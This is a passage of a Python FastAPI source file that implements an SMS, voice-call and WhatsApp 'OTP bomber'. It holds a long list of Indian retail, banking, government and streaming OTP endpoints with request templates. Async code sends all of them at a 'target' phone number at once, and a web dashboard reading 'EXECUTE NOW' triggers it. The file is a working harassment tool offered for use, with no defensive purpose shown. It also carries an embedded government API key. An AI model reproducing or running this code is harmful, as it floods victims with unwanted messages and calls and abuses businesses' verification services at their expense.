    {"name": "Nykaa SMS v2", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa"},
    {"name": "Animall SMS", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","signupPlatform":"NATIVE_ANDROID"}}'},
    {"name": "Entri SMS", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Aakash SMS", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile_number":"{p}","activity_type":"aakash-myadmission"}}'},
    {"name": "Revv SMS", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}","deviceType":"website"}}'},
    {"name": "DeHaat SMS", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}","client_id":"kisan-app"}}'},
    {"name": "A23 Games SMS", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'},
    {"name": "Spencer's SMS", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "PayMe India SMS", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","app_signature":"S10ePIIrbH3"}}'},
    {"name": "Shopper's Stop SMS", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'},
    {"name": "Hyuga Auth SMS", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Lifestyle Stores SMS", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"signInMobile":"{p}","channel":"sms"}}'},
    {"name": "MamaEarth SMS", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "HomeTriangle SMS", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Wellness Forever SMS", "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f'method=firstRegisterApi&data={{"customerMobile":"{p}","generateOtp":"true"}}'},
    {"name": "HealthMug SMS", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Kredily SMS", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Tata Motors SMS", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}","sendOtp":"true"}}'},
    {"name": "Moglix SMS", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}","buildVersion":"24.0"}}'},
    {"name": "TrulyMadly SMS", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}","locale":"IN"}}'},
    {"name": "Apna SMS", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}","hash_type":"play_store"}}'},
    {"name": "Swipe SMS", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}","resend":true}}'},
    {"name": "Country Delight SMS", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}","platform":"Android","mode":"new_user"}}'},
    {"name": "Rapido SMS v2", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "BetterHalf SMS", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}","isd_code":"91"}}'},
    {"name": "Nuvama Wealth SMS", "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNo":"{p}","emailID":"test@example.com"}}'},
    {"name": "Mpokket SMS", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "More Retail SMS", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}","hash_key":"XfsoCeXADQA"}}'},
    {"name": "Charzer SMS", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}","appSource":"CHARZER_APP"}}'},
    {"name": "BikeFixup SMS", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json", "client": "app"}, "data": lambda p, d: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'},
    {"name": "Foxy SMS", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json", "Platform": "web"}, "data": lambda p, d: f'{{"user":{{"phone_number":"+91{p}"}},"via":"sms"}}'},
    {"name": "Licious SMS v2", "url": "https://www.licious.in/api/login/signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","captcha_token":null}}'},

    # ============================================================
    # SECTION 5: GET APIs
    # ============================================================
    {"name": "RedBus OTP", "url": lambda p, d: f"https://m.redbus.in/api/getOtp?number={p}&cc=91", "method": "GET", "headers": {}, "data": None},
    {"name": "Univest OTP", "url": lambda p, d: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "WorkIndia SMS", "url": lambda p, d: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={p}&version_number=623", "method": "GET", "headers": {}, "data": None},
    {"name": "Jockey SMS", "url": lambda p, d: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false", "method": "GET", "headers": {}, "data": None},
    {"name": "Vyapar OTP", "url": lambda p, d: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "ConfirmTkt SMS", "url": lambda p, d: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "CodFirm SMS", "url": lambda p, d: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{p}&email=&storeUrl=bellavita1.myshopify.com", "method": "GET", "headers": {}, "data": None},
    {"name": "Coolwinks SMS", "url": lambda p, d: f"https://api.coolwinks.com/api/accounts/is_already_registered/?username={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "Zee5 OTP", "url": lambda p, d: f"https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "MyGov SMS", "url": lambda p, d: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={p}&gender=male", "method": "GET", "headers": {}, "data": None},
    {"name": "AstroSage SMS", "url": lambda p, d: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "JustDial OTP", "url": lambda p, d: f"https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "HappyEasyGo OTP", "url": lambda p, d: f"https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{p}", "method": "GET", "headers": {}, "data": None},
    {"name": "Airtel OTP", "url": lambda p, d: f"https://www.airtel.in/referral-api/core/notify?messageId=map&rtn={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "Cashify OTP", "url": lambda p, d: f"https://www.cashify.in/api/cu01/v1/app-link?mn={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "BigCash SMS", "url": lambda p, d: f"https://www.bigcash.live/sendsms.php?mobile={p}&ip=192.168.1.1", "method": "GET", "headers": {"Referer": "https://www.bigcash.live/games/poker"}, "data": None},

    # ============================================================
    # SECTION 6: VOICE/CALL APIs
    # ============================================================
    {"name": "Myntra Voice Call", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart Voice Call", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Paytm Voice Call", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Zomato Voice Call", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"phone={p}&type=voice"},
    {"name": "Ola Voice Call", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Uber Voice Call", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Kotak Voice Call", "url": "https://www.kotak.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Amazon Voice Call", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"phone={p}&action=voice_otp"},
    {"name": "MakeMyTrip Voice Call", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Goibibo Voice Call", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "PhonePe Voice Call", "url": "https://www.phonepe.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "BigBasket Voice Call", "url": "https://www.bigbasket.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "BookMyShow Voice Call", "url": "https://in.bookmyshow.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "RedBus Voice Call", "url": "https://www.redbus.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "OLX Call", "url": "https://www.olx.in/api/auth/authenticate?lang=en-IN", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"method":"call","phone":"+91{p}","grantType":"retry"}}'},
    {"name": "Proptiger Call", "url": "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"contactNumber":"{p}","domainId":"2"}}'},

    # ============================================================
    # SECTION 7: WHATSAPP APIs
    # ============================================================
    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8"}, "data": lambda p, d: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
    {"name": "KPN WhatsApp v2", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0", "method": "POST", "headers": {"x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797", "content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
    {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}'},
    {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phoneNo":"{p}"}}'},
    {"name": "Jockey WhatsApp", "url": lambda p, d: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true", "method": "GET", "headers": {}, "data": None},
    {"name": "Rappi WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"country_code":"+91","phone":"{p}"}}'},
    {"name": "Eka Care WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json", "Client-Id": "androidp"}, "data": lambda p, d: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'},
    {"name": "Meesho WhatsApp", "url": "https://meesho.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"number":"{p}","otpOnCall":true}}'},

    # ============================================================
    # SECTION 8: STREAMING APIs
    # ============================================================
    {"name": "Hotstar OTP", "url": "https://api.hotstar.com/um/v3/users/register?register-by=phone_otp", "method": "PUT", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone_number":"{p}","country_prefix":"91"}}'},
    {"name": "SonyLIV OTP", "url": "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}","country":"IN"}}'},
    {"name": "Voot OTP", "url": "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}, "data": lambda p, d: f'{{"type":"mobile","mobile":"{p}","countryCode":"+91"}}'},
    {"name": "AltBalaji OTP", "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone_number":"{p}","country_code":"91","platform":"web"}}'},

    # ============================================================
    # SECTION 9: INDIAN APIS
    # ============================================================
    {"name": "Samsung India OTP", "url": "https://www.samsung.com/in/api/v1/sso/otp/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"user_id":"{p}"}}'},
    {"name": "Meesho OTP", "url": "https://www.meesho.com/api/v1/user/login/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone_number":"{p}"}}'},
    {"name": "PhonePe OTP", "url": "https://aa-interface.phonepe.com/apis/aa-interface/users/otp/trigger", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"rmn":"{p}","purpose":"REGISTRATION"}}'},
    {"name": "Allen Solly OTP", "url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileoremail":"{p}","name":"markluther"}}'},
    {"name": "Frotels OTP", "url": "https://www.frotels.com/appsendsms.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobno={p}"},
    {"name": "Gapoon OTP", "url": "https://www.gapoon.com/userSignup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}","email":"noreply@gmail.com","name":"LexLuthor"}}'},
    {"name": "Porter OTP", "url": "https://porter.in/restservice/send_app_link_sms", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","referrer_string":"","brand":"porter"}}'},
    {"name": "Cityflo OTP", "url": "https://cityflo.com/website-app-download-link-sms/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile_number":"{p}"}}'},
    {"name": "NNNOW OTP", "url": "https://api.nnnow.com/d/api/appDownloadLink", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
    {"name": "AJIO OTP", "url": "https://login.web.ajio.com/api/auth/signupSendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"firstName":"xxps","login":"wiqpdl223@wqew.com","password":"QASpw@1s","genderType":"Male","mobileNumber":"{p}","requestType":"SENDOTP"}}'},
    {"name": "Unacademy App Link", "url": "https://unacademy.com/api/v1/user/get_app_link/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Treebo OTP", "url": "https://www.treebo.com/api/v2/auth/login/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone_number":"{p}"}}'},
    {"name": "MylesCars OTP", "url": "https://www.mylescars.com/usermanagements/chkContact", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"contactNo":"{p}"}}'},
    {"name": "Grofers OTP", "url": "https://grofers.com/v2/accounts/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"user_phone={p}"},
    {"name": "Dream11 App Link", "url": "https://api.dream11.com/sendsmslink", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"siteId":"1","mobileNum":"{p}","appType":"androidfull"}}'},
    {"name": "Paytm App Link", "url": "https://commonfront.paytm.com/v4/api/sendsms", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","guid":"2952fa812660c58dc160ca6c9894221d"}}'},
    {"name": "KFC India OTP", "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin", "method": "POST", "headers": {"Content-Type": "application/json", "Referer": "https://online.kfc.co.in/login"}, "data": lambda p, d: f'{{"AuthorizedFor":"3","phoneNumber":"{p}","Resend":"false"}}'},
    {"name": "IndiaLends OTP", "url": "https://indialends.com/internal/a/mobile-verification_v2.ashx", "method": "POST", "headers": {"Referer": "https://indialends.com/personal-loan"}, "data": lambda p, d: f"aeyder03teaeare=1&ertysvfj74sje=91&jfsdfu14hkgertd={p}&lj80gertdfg=0"},
    {"name": "Flipkart OTP", "url": "https://www.flipkart.com/api/5/user/otp/generate", "method": "POST", "headers": {"X-user-agent": "Mozilla/5.0 FKUA/website/41/website/Desktop", "Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"loginId=+91{p}"},
    {"name": "RedBus OTP v2", "url": "https://m.redbus.in/api/getOtp", "method": "GET", "headers": {}, "data": lambda p, d: f"number={p}&cc=91&whatsAppOpted=false"},
    {"name": "Zee5 OTP v2", "url": "https://b2bapi.zee5.com/device/sendotp_v1.php", "method": "GET", "headers": {}, "data": lambda p, d: f"phoneno={p}"},
    {"name": "ConfirmTkt SMS v2", "url": lambda p, d: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "TooToo SMS", "url": "https://tootoo.in/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{p}","resend":0}}}}'},
]


# ============================================================
# HELPER: Call a single API
# ============================================================

async def call_api(session, api_obj, phone, duration):
    """Call a single API with proper error handling."""
    try:
        url = api_obj["url"](phone, duration) if callable(api_obj["url"]) else api_obj["url"]
    except Exception as e:
        return {"name": api_obj.get("name", "unknown"), "status": "failed", "code": 400, "error": "URL error"}

    method = api_obj.get("method", "GET")
    headers = api_obj.get("headers", {}) or {}

    data = None
    try:
        if api_obj.get("data") is not None and callable(api_obj["data"]):
            data = api_obj["data"](phone, duration)
        elif isinstance(api_obj.get("data"), str):
            data = api_obj["data"]
    except Exception:
        data = None

    try:
        timeout = aiohttp.ClientTimeout(total=4)
        async with session.request(method, url, headers=headers, data=data, timeout=timeout, ssl=False) as response:
            return {"name": api_obj["name"], "status": "success", "code": response.status}
    except asyncio.TimeoutError:
        return {"name": api_obj["name"], "status": "timeout", "code": 408}
    except Exception as e:
        return {"name": api_obj["name"], "status": "failed", "code": 500, "error": str(e)[:120]}


# ============================================================
# ROUTES
# ============================================================

@app.get("/api/input")
async def handle_api_standard(phone: str = Query(None), duration: int = Query(60)):
    """Standard query route: /api/input?phone=9999999999"""
    if not phone:
        return JSONResponse(
            status_code=400,
            content={"status": "error", "owner": "Rudra", "message": "Phone query parameter required. Example: /api/input?phone=9999999999"}
        )

    start_time = time.time()
    async with aiohttp.ClientSession() as session:
        tasks = [call_api(session, api_item, phone, duration) for api_item in APIS]
        results = await asyncio.gather(*tasks)

    success_count = sum(1 for r in results if r["status"] == "success")
    failed_count = len(results) - success_count

    return {
        "status": "completed",
        "owner": "Rudra",
        "target": phone,
        "total_apis": len(APIS),
        "successful_requests": success_count,
        "failed_requests": failed_count,
        "execution_time_seconds": round(time.time() - start_time, 2),
        "results": results
    }


@app.get("/api/input={phone_param}")
async def handle_api_path(phone_param: str, duration: int = Query(60)):
    """Path-style route: /api/input=9999999999"""
    return await handle_api_standard(phone=phone_param, duration=duration)


@app.get("/", response_class=HTMLResponse)
async def serve_ui():
    """Web Dashboard UI"""
    return """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RUDRA POWERFUL API</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
</head>
<body class="bg-gray-950 text-white min-h-screen flex items-center justify-center p-4">
<div class="max-w-xl w-full bg-gray-900/80 backdrop-blur-md rounded-2xl border border-cyan-500/30 p-6 shadow-2xl shadow-cyan-500/10">
<div class="text-center mb-6">
<span class="bg-cyan-500/10 text-cyan-400 text-xs font-semibold px-3 py-1 rounded-full border border-cyan-500/30">MADE BY RUDRA</span>
<h1 class="text-3xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-blue-600 mt-2">API CONTROLLER</h1>
<p class="text-gray-400 text-sm mt-1">High-Speed Parallel API Execution Engine</p>
</div>
<div class="space-y-4">
<div>
<label class="text-xs text-gray-400 mb-1 block">Target Mobile Number</label>
<input type="text" id="phone" placeholder="Enter 10 digit number" class="w-full bg-gray-800/80 border border-gray-700 focus:border-cyan-500 text-white rounded-lg px-4 py-3 outline-none transition">
</div>
<button onclick="triggerApi()" id="btn" class="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-600 hover:to-blue-700 font-bold py-3 rounded-lg flex items-center justify-center space-x-2 transition shadow-lg shadow-cyan-500/20">
<i class="fa-solid fa-bolt"></i>
<span>EXECUTE NOW</span>
</button>
</div>
<div class="mt-6 bg-gray-950/70 border border-gray-800 rounded-lg p-4">
<div class="flex justify-between items-center text-xs text-gray-400 mb-2">
<span>API ENDPOINT URL</span>
<span class="text-cyan-400">GET Request</span>
</div>
<code id="apiLink" class="text-xs text-cyan-300 block break-all font-mono">/api/input?phone=YOUR_NUMBER</code>
</div>
<div id="output" class="hidden mt-4 p-4 bg-gray-950 rounded-lg border border-gray-800 text-xs font-mono max-h-60 overflow-y-auto"></div>
</div>
<script>
async function triggerApi() {
    const phone = document.getElementById('phone').value;
    const output = document.getElementById('output');
    const btn = document.getElementById('btn');
    const apiLink = document.getElementById('apiLink');
    if(!phone) { alert('Please enter target phone number!'); return; }
    const endpoint = `/api/input?phone=${phone}`;
    apiLink.innerText = window.location.origin + endpoint;
    btn.disabled = true;
    btn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i> Processing...`;
    output.classList.remove('hidden');
    output.innerHTML = '<span class="text-yellow-400">Dispatching concurrent requests across nodes...</span>';
    try {
        const res = await fetch(endpoint);
        const data = await res.json();
        output.innerHTML = `<pre class="text-green-400">${JSON.stringify(data, null, 2)}</pre>`;
    } catch (e) {
        output.innerHTML = `<span class="text-red-400">Error: ${e.message}</span>`;
    } finally {
        btn.disabled = false;
        btn.innerHTML = `<i class="fa-solid fa-bolt"></i> <span>EXECUTE NOW</span>`;
    }
}
</script>
</body>
</html>
"""


# ============================================================
# ENTRY POINT
# ============================================================

if __name__ == "__main__":
    import uvicorn
    print(f"[+] Loaded {len(APIS)} APIs")
    uvicorn.run(app, host="0.0.0.0", port=8000)
